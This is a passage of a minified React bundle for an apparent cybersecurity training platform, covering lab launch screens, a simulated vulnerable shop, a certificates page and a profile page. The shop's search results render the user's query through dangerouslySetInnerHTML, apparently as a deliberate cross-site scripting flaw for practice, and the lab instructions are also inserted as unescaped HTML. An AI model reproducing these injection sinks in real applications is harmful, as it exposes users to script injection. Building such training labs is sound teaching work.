p-8",children:[e.jsx("h2",{className:"text-2xl font-bold mb-6",children:"Featured Products"}),e.jsx("div",{className:"grid grid-cols-3 gap-6",children:[1,2,3].map(c=>e.jsxs("div",{className:"border rounded-lg p-4 shadow-sm hover:shadow-md transition-shadow",children:[e.jsx("div",{className:"h-40 bg-gray-200 rounded mb-4"}),e.jsxs("h3",{className:"font-bold mb-2",children:["Product ",c]}),e.jsx("p",{className:"text-gray-600 text-sm mb-4",children:"Lorem ipsum dolor sit amet."}),e.jsx("button",{className:"w-full bg-indigo-600 text-white py-2 rounded hover:bg-indigo-700",children:"Add to Cart"})]},c))}),a&&e.jsxs("div",{className:"mt-8 p-4 bg-yellow-50 border border-yellow-200 rounded",children:[e.jsxs("h3",{className:"font-bold text-yellow-800 mb-2",children:["Search Results for: ",e.jsx("span",{dangerouslySetInnerHTML:{__html:a}})]}),e.jsxs("p",{className:"text-sm text-yellow-700",children:["Found ",s.length," items."]})]})]})]})},f2=({labTitle:a,onBack:n})=>{const[s,i]=v.useState("running"),o=()=>{i("starting"),setTimeout(()=>i("running"),1e3)};return e.jsxs("div",{className:"flex flex-col h-screen bg-[#050505] text-[#EAEAEA] overflow-hidden",children:[e.jsxs("div",{className:"bg-[#0A0F0A] border-b border-[#00FF88]/10 p-4 flex items-center justify-between shadow-md z-10",children:[e.jsxs("div",{className:"flex items-center space-x-4",children:[e.jsxs("button",{onClick:n,className:"text-gray-400 hover:text-white transition-colors flex items-center space-x-1",children:[e.jsx(ys,{className:"h-4 w-4"}),e.jsx("span",{children:"Back"})]}),e.jsx("div",{className:"h-6 w-px bg-gray-800"}),e.jsx("h1",{className:"text-lg font-bold text-white tracking-tight",children:a}),e.jsxs("div",{className:`px-2 py-0.5 rounded-full text-xs font-bold uppercase tracking-wider flex items-center space-x-1 ${s==="running"?"bg-[#00FF88]/10 text-[#00FF88] border border-[#00FF88]/20":s==="starting"?"bg-yellow-500/10 text-yellow-500 border border-yellow-500/20":"bg-red-500/10 text-red-500 border border-red-500/20"}`,children:[e.jsx(za,{className:"h-3 w-3"}),e.jsx("span",{children:s})]})]}),e.jsxs("div",{className:"flex items-center space-x-3",children:[e.jsxs("button",{onClick:o,className:"flex items-center space-x-2 px-3 py-1.5 bg-[#0A0F0A] hover:bg-[#1A1F1A] border border-gray-800 rounded text-sm transition-colors",children:[e.jsx(uy,{className:"h-3 w-3"}),e.jsx("span",{children:"Reset Environment"})]}),e.jsxs("button",{className:"flex items-center space-x-2 px-4 py-1.5 bg-[#00FF88] hover:bg-[#00CC66] text-black font-bold rounded text-sm transition-all hover:shadow-[0_0_15px_rgba(0,255,136,0.3)]",children:[e.jsx(Pe,{className:"h-4 w-4"}),e.jsx("span",{children:"Submit Flag"})]})]})]}),e.jsxs("div",{className:"flex-1 flex overflow-hidden",children:[e.jsxs("div",{className:"w-1/2 p-4 flex flex-col border-r border-[#00FF88]/10 bg-[#050505]",children:[e.jsxs("div",{className:"flex items-center justify-between mb-2 px-1",children:[e.jsx("h2",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest",children:"Target System"}),e.jsx("span",{className:"text-xs text-gray-600 font-mono",children:"192.168.1.10"})]}),e.jsx("div",{className:"flex-1 rounded-lg overflow-hidden shadow-2xl border border-gray-800 bg-black",children:e.jsx(d2,{initialUrl:"http://vulnerable-bank.lab:8080"})})]}),e.jsxs("div",{className:"w-1/2 p-4 flex flex-col bg-[#050505]",children:[e.jsxs("div",{className:"flex items-center justify-between mb-2 px-1",children:[e.jsx("h2",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest",children:"Command Center"}),e.jsx("span",{className:"text-xs text-gray-600 font-mono",children:"10.10.14.5"})]}),e.jsx("div",{className:"flex-1 rounded-lg overflow-hidden shadow-2xl",children:e.jsx(c2,{})})]})]})]})},m2=({labId:a,onBack:n})=>{const[s,i]=gd.useState(!1),o=ds.find(f=>f.id===a),c=()=>{n()};if(!o)return e.jsx("div",{className:"p-6 min-h-screen bg-gradient-to-br from-slate-900 to-slate-800",children:e.jsxs("div",{className:"max-w-4xl mx-auto text-center py-20",children:[e.jsx(He,{className:"h-16 w-16 text-red-500 mx-auto mb-4"}),e.jsx("h2",{className:"text-2xl font-bold text-white mb-2",children:"Lab Not Found"}),e.jsx("p",{className:"text-[#00B37A] mb-6",children:"The requested simulation does not exist."}),e.jsx("button",{onClick:c,className:"px-6 py-3 bg-[#00FF88] text-black font-bold rounded-lg hover:bg-[#00CC66] transition-colors",children:"Return to Labs"})]})});if(s)return e.jsx(f2,{labId:a,labTitle:o.title,onComplete:()=>{o.completed=!0,i(!1)},onBack:()=>i(!1)});const d=f=>{switch(f){case"beginner":return"text-[#00FF88] border-[#00FF88]/30 bg-[#00FF88]/10";case"intermediate":return"text-yellow-400 border-yellow-400/30 bg-yellow-400/10";case"advanced":return"text-red-400 border-red-400/30 bg-red-400/10";default:return"text-slate-400 border-slate-400/30 bg-slate-400/10"}},m=()=>{o.completed=!0,alert("Lab marked as completed!")};return e.jsx("div",{className:"p-6 min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-5xl mx-auto space-y-6",children:[e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("button",{onClick:c,className:"flex items-center space-x-2 text-[#00B37A] hover:text-[#00FF88] transition-colors group",children:[e.jsx(ys,{className:"h-5 w-5 group-hover:-translate-x-1 transition-transform"}),e.jsx("span",{className:"font-medium",children:"Back to Simulations"})]}),o.completed&&e.jsxs("div",{className:"flex items-center space-x-2 px-3 py-1.5 rounded-lg bg-[#00FF88]/10 border border-[#00FF88]/20",children:[e.jsx(Pe,{className:"h-5 w-5 text-[#00FF88]"}),e.jsx("span",{className:"font-medium text-[#00FF88]",children:"Mission Complete"})]})]}),e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden",children:[e.jsxs("div",{className:"p-8",children:[e.jsxs("div",{className:"flex items-start justify-between mb-6",children:[e.jsxs("div",{className:"flex-1",children:[e.jsxs("div",{className:"flex items-center space-x-3 mb-3",children:[e.jsx("div",{className:"p-2 rounded-lg bg-[#00FF88]/10 border border-[#00FF88]/20",children:e.jsx(He,{className:"h-6 w-6 text-[#00FF88]"})}),e.jsx("h1",{className:"text-3xl font-bold text-white",children:o.title})]}),e.jsx("p",{className:"text-[#00B37A] text-lg mb-6 max-w-2xl",children:o.description}),e.jsxs("div",{className:"flex items-center space-x-6 text-sm font-mono",children:[e.jsx("span",{className:`px-3 py-1 rounded border ${d(o.difficulty)} uppercase font-bold tracking-wider`,children:o.difficulty}),e.jsxs("div",{className:"flex items-center space-x-2 text-[#EAEAEA]/60",children:[e.jsx(Pt,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{children:o.estimatedTime})]}),e.jsxs("div",{className:"flex items-center space-x-2 text-[#EAEAEA]/60",children:[e.jsx(zt,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{children:"SOLO MISSION"})]})]})]}),e.jsxs("div",{className:"flex flex-col space-y-3 ml-6",children:[e.jsxs("button",{onClick:()=>i(!0),className:"flex items-center space-x-2 px-6 py-3 bg-[#00FF88] text-black font-bold rounded-lg hover:bg-[#00CC66] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)] transition-all",children:[e.jsx(Bt,{className:"h-5 w-5"}),e.jsx("span",{children:"Launch Simulation"})]}),o.liveUrl&&e.jsxs("a",{href:o.liveUrl,target:"_blank",rel:"noopener noreferrer",className:"flex items-center justify-center space-x-2 px-6 py-3 bg-[#0A0F0A] border border-[#00FF88]/20 text-[#00FF88] font-bold rounded-lg hover:bg-[#00FF88]/10 transition-all",children:[e.jsx(Ao,{className:"h-5 w-5"}),e.jsx("span",{children:"External Target"})]})]})]}),e.jsxs("div",{className:"border-t border-[#00FF88]/10 pt-6",children:[e.jsx("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-4",children:"Required Arsenal"}),e.jsx("div",{className:"flex flex-wrap gap-2",children:o.tools.map((f,x)=>e.jsx("span",{className:"bg-black/40 text-[#EAEAEA] px-4 py-2 rounded-lg border border-[#00FF88]/20 text-sm font-mono hover:border-[#00FF88]/40 transition-colors",children:f},x))})]})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-0 border-t border-[#00FF88]/10",children:[e.jsx("button",{onClick:()=>i(!0),className:"p-6 hover:bg-[#00FF88]/5 transition-colors border-r border-[#00FF88]/10 group",children:e.jsxs("div",{className:"flex items-center space-x-3",children:[e.jsx("div",{className:"p-2 rounded-lg bg-[#00FF88]/10 border border-[#00FF88]/20 group-hover:bg-[#00FF88]/20 transition-colors",children:e.jsx(He,{className:"h-5 w-5 text-[#00FF88]"})}),e.jsxs("div",{className:"text-left",children:[e.jsx("h4",{className:"font-medium text-white",children:"Lab Environment"}),e.jsx("p",{className:"text-[#00B37A] text-sm",children:"Launch isolated sandbox"})]})]})}),e.jsx("button",{className:"p-6 hover:bg-[#00FF88]/5 transition-colors border-r border-[#00FF88]/10 group",children:e.jsxs("div",{className:"flex items-center space-x-3",children:[e.jsx("div",{className:"p-2 rounded-lg bg-[#00FF88]/10 border border-[#00FF88]/20 group-hover:bg-[#00FF88]/20 transition-colors",children:e.jsx(ze,{className:"h-5 w-5 text-[#00FF88]"})}),e.jsxs("div",{className:"text-left",children:[e.jsx("h4",{className:"font-medium text-white",children:"Documentation"}),e.jsx("p",{className:"text-[#00B37A] text-sm",children:"Reference materials"})]})]})}),e.jsx("button",{className:"p-6 hover:bg-[#00FF88]/5 transition-colors group",children:e.jsxs("div",{className:"flex items-center space-x-3",children:[e.jsx("div",{className:"p-2 rounded-lg bg-[#00FF88]/10 border border-[#00FF88]/20 group-hover:bg-[#00FF88]/20 transition-colors",children:e.jsx(zt,{className:"h-5 w-5 text-[#00FF88]"})}),e.jsxs("div",{className:"text-left",children:[e.jsx("h4",{className:"font-medium text-white",children:"Community"}),e.jsx("p",{className:"text-[#00B37A] text-sm",children:"Get assistance"})]})]})})]})]}),e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-yellow-500/20 p-6 relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-yellow-500/5"}),e.jsxs("div",{className:"relative flex items-start space-x-4",children:[e.jsx("div",{className:"p-2 rounded-lg bg-yellow-500/10 border border-yellow-500/20",children:e.jsx(or,{className:"h-5 w-5 text-yellow-500"})}),e.jsxs("div",{children:[e.jsx("h4",{className:"font-bold text-yellow-500 uppercase tracking-wider mb-1",children:"Security Protocol"}),e.jsx("p",{className:"text-yellow-500/80 text-sm",children:"Interact only with provided demo targets. Do not attack systems you do not own or have explicit permission to test. All activities are logged for training purposes."})]})]})]}),o.liveUrl&&e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden",children:[e.jsxs("div",{className:"p-4 border-b border-[#00FF88]/10 flex items-center justify-between",children:[e.jsxs("h3",{className:"text-lg font-bold text-white flex items-center space-x-2",children:[e.jsx(He,{className:"h-5 w-5 text-[#00FF88]"}),e.jsx("span",{children:"Embedded Sandbox"})]}),e.jsx("span",{className:"text-xs text-[#00B37A] font-mono",children:"PROXY MODE"})]}),e.jsx("div",{className:"bg-black",children:e.jsx("iframe",{src:`http://localhost:5174/proxy?url=${encodeURIComponent(o.liveUrl)}`,sandbox:"allow-scripts allow-forms allow-same-origin allow-popups",className:"w-full h-[500px]",title:"Embedded Lab Target"})}),e.jsx("p",{className:"text-xs text-[#00B37A]/60 p-3 font-mono",children:"Embedded via local proxy. Only allowlisted demo domains are permitted."})]}),e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden",children:[e.jsx("div",{className:"p-4 border-b border-[#00FF88]/10",children:e.jsxs("h2",{className:"text-xl font-bold text-white flex items-center space-x-2",children:[e.jsx(ze,{className:"h-5 w-5 text-[#00FF88]"}),e.jsx("span",{children:"Mission Briefing"})]})}),e.jsxs("div",{className:"p-6 border-b border-[#00FF88]/10",children:[e.jsxs("h3",{className:"text-lg font-bold text-white mb-4 flex items-center space-x-2",children:[e.jsx(Bt,{className:"h-5 w-5 text-[#00FF88]"}),e.jsx("span",{children:"Demonstration Video"})]}),e.jsx(Bd,{videoUrl:"https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4",title:`${o.title} - Demonstration`,onProgress:f=>console.log("Lab video progress:",f),onComplete:()=>console.log("Lab video completed")})]}),e.jsx("div",{className:"p-6",children:e.jsx("div",{className:"prose prose-invert max-w-none",children:e.jsx("div",{className:"text-[#EAEAEA] leading-relaxed",dangerouslySetInnerHTML:{__html:(()=>{let f=o.instructions.replace(/\n/g,"<br/>");return f=f.replace(/```([\s\S]*?)```/g,(x,p)=>`<pre class="bg-black/50 border border-[#00FF88]/20 p-4 rounded-lg mt-4 mb-4 overflow-x-auto font-mono text-sm text-[#00FF88]"><code>${p}</code></pre>`),f=f.replace(/`([^`]+)`/g,(x,p)=>`<code class="bg-black/50 px-2 py-0.5 rounded text-[#00FF88] font-mono text-sm">${p}</code>`),f=f.replace(/^# (.+)$/gm,(x,p)=>`<h1 class="text-2xl font-bold mb-4 mt-6 text-white">${p}</h1>`),f=f.replace(/^## (.+)$/gm,(x,p)=>`<h2 class="text-xl font-bold mb-3 mt-6 text-white">${p}</h2>`),f=f.replace(/^### (.+)$/gm,(x,p)=>`<h3 class="text-lg font-bold mb-2 mt-4 text-[#00FF88]">${p}</h3>`),f=f.replace(/^- (.+)$/gm,(x,p)=>`<li class="ml-4 text-[#00B37A]"> ${p}</li>`),f=f.replace(/^(\d+)\. (.+)$/gm,(x,p,b)=>`<li class="ml-4 text-[#00B37A]">${p}. ${b}</li>`),f})()}})})})]}),o.completed?e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/20 p-6 relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-[#00FF88]/5"}),e.jsxs("div",{className:"relative flex items-center space-x-4",children:[e.jsx("div",{className:"p-3 rounded-full bg-[#00FF88]/10 border border-[#00FF88]/20",children:e.jsx(Pe,{className:"h-8 w-8 text-[#00FF88]"})}),e.jsxs("div",{children:[e.jsx("h3",{className:"font-bold text-[#00FF88] text-lg",children:"Mission Accomplished!"}),e.jsx("p",{className:"text-[#00B37A]",children:"Outstanding work, operative. You've successfully completed this simulation."})]})]})]}):e.jsx("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("h3",{className:"font-bold text-white text-lg",children:"Mission Completion"}),e.jsx("p",{className:"text-[#00B37A]",children:"Mark this simulation as complete once you've finished all objectives."})]}),e.jsx("button",{onClick:m,className:"px-6 py-3 bg-[#00FF88] text-black font-bold rounded-lg hover:bg-[#00CC66] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)] transition-all",children:"Complete Mission"})]})})]})})},p2=()=>{const{user:a}=Ie(),n=[{id:"owasp-top-10",title:"OWASP Top 10 Security Risks",description:"Complete understanding of the most critical web application security risks",requirements:["Complete all 10 OWASP modules","Pass module tests with 80% or higher","Complete at least 5 hands-on labs","Pass final certification exam"],progress:30,earned:!1,estimatedHours:20},{id:"web-app-security",title:"Web Application Security Fundamentals",description:"Comprehensive knowledge of web application security principles and practices",requirements:["Complete assessment test","Finish penetration testing modules","Complete secure coding practices","Demonstrate practical skills"],progress:15,earned:!1,estimatedHours:30},{id:"ethical-hacking",title:"Certified Ethical Hacker (Prep)",description:"Preparation for ethical hacking certification with hands-on experience",requirements:["Complete advanced security modules","Master penetration testing tools","Complete capstone project","Pass comprehensive exam"],progress:5,earned:!1,estimatedHours:50}],s=a?.certificates||[];return e.jsx("div",{className:"p-6 min-h-screen animate-fade-in text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-6xl mx-auto space-y-8",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("div",{children:[e.jsxs("h1",{className:"text-3xl font-black tracking-tighter text-white uppercase",children:["Official ",e.jsx("span",{className:"text-[#00FF88]",children:"Credentials"})]}),e.jsx("p",{className:"text-[#00B37A] font-mono text-sm mt-1",children:"VERIFIED OPERATOR STATUS"})]}),e.jsx("div",{className:"h-10 w-10 rounded bg-[#00FF88]/10 border border-[#00FF88]/20 flex items-center justify-center",children:e.jsx(tt,{className:"h-5 w-5 text-[#00FF88]"})})]}),s.length>0&&e.jsxs("div",{className:"mb-8",children:[e.jsx("h2",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-4",children:"Acquired Credentials"}),e.jsx("div",{className:"grid gap-6",children:s.map((i,o)=>{const c=typeof i=="string"&&(i.startsWith("http://")||i.startsWith("https://")),d=c?null:n.find(m=>m.id===i);return!c&&!d?null:c?e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl p-6 relative overflow-hidden group",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-[#00FF88]/0 via-[#00FF88]/0 to-[#00FF88]/0 group-hover:via-[#00FF88]/5 transition-all duration-500"}),e.jsxs("div",{className:"flex items-center justify-between relative",children:[e.jsxs("div",{className:"flex items-center space-x-6",children:[e.jsx("div",{className:"bg-[#00FF88]/10 p-4 rounded-lg border border-[#00FF88]/20",children:e.jsx(tt,{className:"h-8 w-8 text-[#00FF88]"})}),e.jsxs("div",{children:[e.jsx("h3",{className:"text-xl font-bold text-white uppercase tracking-tight",children:"Verified Certificate"}),e.jsxs("p",{className:"text-[#00B37A] font-mono text-sm",children:["DIGITAL ID: ",Math.random().toString(36).substr(2,9).toUpperCase()]}),e.jsxs("div",{className:"flex items-center space-x-2 mt-2 text-xs text-[#EAEAEA]/60 font-mono",children:[e.jsx(xo,{className:"h-3 w-3"}),e.jsxs("span",{children:["ISSUED: ",new Date().toLocaleDateString()]})]})]})]}),e.jsxs("a",{href:i,target:"_blank",rel:"noreferrer",className:"flex items-center space-x-2 bg-[#00FF88] text-black px-6 py-3 rounded-lg hover:bg-[#00CC66] transition-all shadow-[0_0_20px_rgba(0,255,136,0.3)] font-bold",children:[e.jsx(Us,{className:"h-4 w-4"}),e.jsx("span",{children:"DOWNLOAD ENCRYPTED"})]})]})]},`url-${o}`):e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl p-6 relative overflow-hidden group",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-[#00FF88]/0 via-[#00FF88]/0 to-[#00FF88]/0 group-hover:via-[#00FF88]/5 transition-all duration-500"}),e.jsxs("div",{className:"flex items-center justify-between relative",children:[e.jsxs("div",{className:"flex items-center space-x-6",children:[e.jsx("div",{className:"bg-[#00FF88]/10 p-4 rounded-lg border border-[#00FF88]/20",children:e.jsx(tt,{className:"h-8 w-8 text-[#00FF88]"})}),e.jsxs("div",{children:[e.jsx("h3",{className:"text-xl font-bold text-white uppercase tracking-tight",children:d.title}),e.jsx("p",{className:"text-[#00B37A] font-mono text-sm",children:d.description}),e.jsxs("div",{className:"flex items-center space-x-2 mt-2 text-xs text-[#EAEAEA]/60 font-mono",children:[e.jsx(xo,{className:"h-3 w-3"}),e.jsx("span",{children:"ISSUED: 2024-03-15"})]})]})]}),e.jsxs("button",{className:"flex items-center space-x-2 bg-[#00FF88] text-black px-6 py-3 rounded-lg hover:bg-[#00CC66] transition-all shadow-[0_0_20px_rgba(0,255,136,0.3)] font-bold",children:[e.jsx(Us,{className:"h-4 w-4"}),e.jsx("span",{children:"DOWNLOAD ENCRYPTED"})]})]})]},d.id)})})]}),e.jsxs("div",{children:[e.jsx("h2",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-4",children:"Available Credentials"}),e.jsx("div",{className:"grid gap-6",children:n.map(i=>{const o=s.includes(i.id)||s.some(c=>typeof c=="string"&&c.includes(i.id));return e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden hover:border-[#00FF88]/30 transition-all duration-300 group relative",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-[#00FF88]/0 via-[#00FF88]/0 to-[#00FF88]/0 group-hover:via-[#00FF88]/5 transition-all duration-500"}),e.jsxs("div",{className:"p-6 relative",children:[e.jsxs("div",{className:"flex items-start justify-between mb-6",children:[e.jsxs("div",{className:"flex items-start space-x-6",children:[e.jsx("div",{className:`p-4 rounded-lg border ${o?"bg-[#00FF88]/10 border-[#00FF88]/20":"bg-black border-[#00FF88]/10"}`,children:e.jsx(tt,{className:`h-8 w-8 ${o?"text-[#00FF88]":"text-[#EAEAEA]/40"}`})}),e.jsxs("div",{className:"flex-1",children:[e.jsxs("div",{className:"flex items-center space-x-2 mb-2",children:[e.jsx("h3",{className:"text-xl font-bold text-white group-hover:text-[#00FF88] transition-colors uppercase tracking-tight",children:i.title}),o&&e.jsx(Pe,{className:"h-5 w-5 text-[#00FF88]"})]}),e.jsx("p",{className:"text-[#00B37A] mb-4 max-w-2xl",children:i.description}),e.jsxs("div",{className:"flex items-center space-x-6 text-xs text-[#EAEAEA]/60 font-mono mb-4",children:[e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(Va,{className:"h-3 w-3 text-[#00FF88]"}),e.jsx("span",{children:"PROFESSIONAL TIER"})]}),e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(xo,{className:"h-3 w-3 text-[#00FF88]"}),e.jsxs("span",{children:["~",i.estimatedHours," HOURS EST."]})]})]})]})]}),!o&&e.jsxs("div",{className:"text-right",children:[e.jsxs("div",{className:"text-2xl font-bold text-[#00FF88] font-mono",children:[i.progress,"%"]}),e.jsx("div",{className:"text-[#00B37A] text-[10px] uppercase tracking-wider",children:"Completion"})]})]}),!o&&e.jsx("div",{className:"mb-6",children:e.jsx("div",{className:"w-full bg-black rounded-full h-1.5 border border-[#00FF88]/10",children:e.jsx("div",{className:"bg-[#00FF88] h-full rounded-full transition-all duration-500 shadow-[0_0_10px_rgba(0,255,136,0.5)]",style:{width:`${i.progress}%`}})})}),e.jsxs("div",{className:"border-t border-[#00FF88]/10 pt-6",children:[e.jsx("h4",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-3",children:"Clearance Requirements"}),e.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-3",children:i.requirements.map((c,d)=>e.jsxs("div",{className:"flex items-center space-x-3 text-sm group/req",children:[e.jsx("div",{className:"h-1.5 w-1.5 bg-[#00FF88] rounded-full group-hover/req:shadow-[0_0_5px_#00FF88] transition-all"}),e.jsx("span",{className:"text-[#EAEAEA] group-hover/req:text-white transition-colors",children:c})]},d))})]}),e.jsx("div",{className:"mt-6 pt-6 border-t border-[#00FF88]/10",children:o?e.jsxs("button",{className:"w-full bg-[#00FF88]/10 text-[#00FF88] border border-[#00FF88]/20 py-3 rounded-lg transition-colors flex items-center justify-center space-x-2 hover:bg-[#00FF88]/20 font-bold",children:[e.jsx(Us,{className:"h-4 w-4"}),e.jsx("span",{children:"DOWNLOAD ENCRYPTED CERTIFICATE"})]}):e.jsx("button",{className:"w-full bg-[#00FF88] text-black py-3 rounded-lg hover:bg-[#00CC66] transition-all shadow-[0_0_20px_rgba(0,255,136,0.3)] font-bold uppercase tracking-wide",children:"Resume Training"})})]})]},i.id)})})]}),e.jsxs("div",{className:"mt-8 bg-[#0A0F0A] border border-[#00FF88]/10 rounded-xl p-6 relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-[linear-gradient(45deg,transparent_25%,rgba(0,255,136,0.02)_50%,transparent_75%,transparent_100%)] bg-[length:250%_250%,100%_100%] animate-[shimmer_3s_infinite]"}),e.jsxs("div",{className:"relative z-10",children:[e.jsxs("h3",{className:"font-bold text-white mb-4 flex items-center gap-2",children:[e.jsx(ze,{className:"h-4 w-4 text-[#00FF88]"}),"Credential Verification Protocols"]}),e.jsxs("div",{className:"text-[#00B37A] space-y-2 text-sm font-mono",children:[e.jsx("p",{children:" Industry-recognized credentials validating operational capabilities."}),e.jsx("p",{children:" Encrypted digital certificates with unique hash verification."}),e.jsx("p",{children:" Continuing education credits for clearance level maintenance."}),e.jsx("p",{children:" Integration with external professional networks."}),e.jsx("p",{children:" Real-time synchronization with global security standards."})]})]})]})]})})},x2=()=>{const{user:a}=Ie();if(!a)return null;const n=[{id:1,title:"First Steps",description:"Completed your first assessment",icon:Ua,earned:a.completedAssessment},{id:2,title:"Knowledge Seeker",description:"Completed 3 course modules",icon:xr,earned:!1},{id:3,title:"Lab Expert",description:"Completed 5 hands-on labs",icon:Va,earned:!1},{id:4,title:"Security Pro",description:"Earned your first certificate",icon:tt,earned:(a.certificates?.length??0)>0}],s=[{skill:"WEB APP SECURITY",progress:65,color:"bg-[#00FF88]"},{skill:"NETWORK DEFENSE",progress:30,color:"bg-blue-500"},{skill:"CRYPTOGRAPHY",progress:45,color:"bg-purple-500"},{skill:"INCIDENT RESPONSE",progress:20,color:"bg-red-500"},{skill:"PENETRATION TESTING",progress:35,color:"bg-yellow-500"}];return e.jsx("div",{className:"p-6 min-h-screen animate-fade-in text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-4xl mx-auto space-y-8",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("div",{children:[e.jsxs("h1",{className:"text-3xl font-black tracking-tighter text-white uppercase",children:["Operator ",e.jsx("span",{className:"text-[#00FF88]",children:"Profile"})]}),e.jsx("p",{className:"text-[#00B37A] font-mono text-sm mt-1",children:"PERSONNEL RESUME"})]}),e.jsx("div",{className:"h-10 w-10 rounded bg-[#00FF88]/10 border border-[#00FF88]/20 flex items-center justify-center",children:e.jsx(zt,{className:"h-5 w-5 text-[#00FF88]"})})]}),e.jsxs("div",{className:"bg-[#0A0F0A] rounded-2xl border border-[#00FF88]/20 p-8 relative overflow-hidden group",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-[#00FF88]/0 via-[#00FF88]/0 to-[#00FF88]/0 group-hover:via-[#00FF88]/5 transition-all duration-500"}),e.jsx("div",{className:"absolute top-0 right-0 w-64 h-64 bg-[#00FF88]/5 rounded-full blur-3xl -mr-16 -mt-16 pointer-events-none"}),e.jsxs("div",{className:"flex flex-col md:flex-row items-center gap-8 relative z-10",children:[e.jsxs("div",{className:"w-24 h-24 bg-black rounded-full flex items-center justify-center border-2 border-[#00FF88]/30 shadow-[0_0_20px_rgba(0,255,136,0.2)] relative",children:[e.jsx(zt,{className:"h-12 w-12 text-[#00FF88]"}),e.jsx("div",{className:"absolute bottom-0 right-0 h-6 w-6 bg-[#00FF88] rounded-full border-4 border-black flex items-center justify-center",children:e.jsx(ze,{className:"h-3 w-3 text-black fill-current"})})]}),e.jsxs("div",{className:"flex-1 text-center md:text-left space-y-2",children:[e.jsx("h2",{className:"text-3xl font-black text-white tracking-tight uppercase",children:a.name}),e.jsx("p",{className:"text-[#00B37A] font-mono text-sm",children:a.email}),e.jsxs("div",{className:"pt-2 flex items-center justify-center md:justify-start gap-3",children:[e.jsxs("span",{className:`inline-flex items-center px-3 py-1 rounded text-xs font-bold uppercase tracking-wider border ${a.level==="advanced"?"bg-red-500/10 text-red-400 border-red-500/20":a.level==="intermediate"?"bg-yellow-500/10 text-yellow-400 border-yellow-500/20":"bg-[#00FF88]/10 text-[#00FF88] border-[#00FF88]/20"}`,children:[(a.level||"beginner").toUpperCase()," CLEARANCE"]}),e.jsxs("span",{className:"inline-flex items-center px-3 py-1 rounded text-xs font-bold uppercase tracking-wider border border-[#00FF88]/20 bg-black text-[#EAEAEA]",children:["ID: ",Math.random().toString(36).substr(2,6).toUpperCase()]})]})]}),e.jsxs("div",{className:"text-center md:text-right bg-black p-4 rounded-xl border border-[#00FF88]/20 shadow-[0_0_15px_rgba(0,255,136,0.1)]",children:[e.jsx("div",{className:"text-4xl font-black text-[#00FF88] mb-1 font-mono",children:"85%"}),e.jsx("div",{className:"text-[#00B37A] text-[10px] uppercase tracking-wider",children:"Mission Readiness"})]})]})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-8",children:[e.jsxs("div",{className:"bg-[#0A0F0A] rounded-2xl border border-[#00FF88]/10 p-6 relative overflow-hidden",children:[e.jsxs("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-6 flex items-center gap-2",children:[e.jsx(xs,{className:"h-4 w-4"}),"Combat Capabilities"]}),e.jsx("div",{className:"space-y-6",children:s.map((i,o)=>e.jsxs("div",{className:"group",children:[e.jsxs("div",{className:"flex justify-between text-xs text-[#EAEAEA] mb-2 font-mono uppercase tracking-wider",children:[e.jsx("span",{className:"group-hover:text-[#00FF88] transition-colors",children:i.skill}),e.jsxs("span",{className:"text-[#00FF88]",children:[i.progress,"%"]})]}),e.jsx("div",{className:"w-full bg-black rounded-full h-1.5 border border-[#00FF88]/10 overflow-hidden",children:e.jsx("div",{className:`h-full rounded-full transition-all duration-500 relative ${i.color}`,style:{width:`${i.progress}%`,boxShadow:`0 0 10px ${i.color==="bg-[#00FF88]"?"rgba(0,255,136,0.5)":"rgba(255,255,255,0.2)"}`}})})]},o))})]}),e.jsxs("div",{className:"bg-[#0A0F0A] rounded-2xl border border-[#00FF88]/10 p-6 relative overflow-hidden",children:[e.jsxs("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-6 flex items-center gap-2",children:[e.jsx(za,{className:"h-4 w-4"}),"Operational Metrics"]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{className:"text-center p-5 bg-black rounded-xl 